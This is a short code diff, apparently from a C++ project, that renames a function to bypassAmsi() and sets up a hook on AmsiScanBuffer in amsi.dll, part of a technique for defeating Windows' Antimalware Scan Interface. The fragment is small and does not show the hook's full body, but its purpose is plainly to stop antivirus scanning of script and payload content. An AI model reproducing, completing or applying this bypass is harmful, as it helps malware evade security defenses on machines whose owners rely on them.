@@ -31,9 +31,9 @@ HRESULT hookAmsiScanBuffer(HAMSICONTEXT amsiContext, PVOID buffer, ULONG length,
 	return orgCallResult;
 }
 
-void hookAmsiScanBuffer() {
+void bypassAmsi() {
 
-	LoadLibraryA("amsi.dll"); // since amsi isn't loaded by the windows loader by default
+	// assuming that amsi.dll is loaded
 
 	Rc7Hook amsiScanBufferHook{ "amsi.dll", "AmsiScanBuffer", hookAmsiScanBuffer, (PVOID*)&orgAmsiScanBuffer };
 
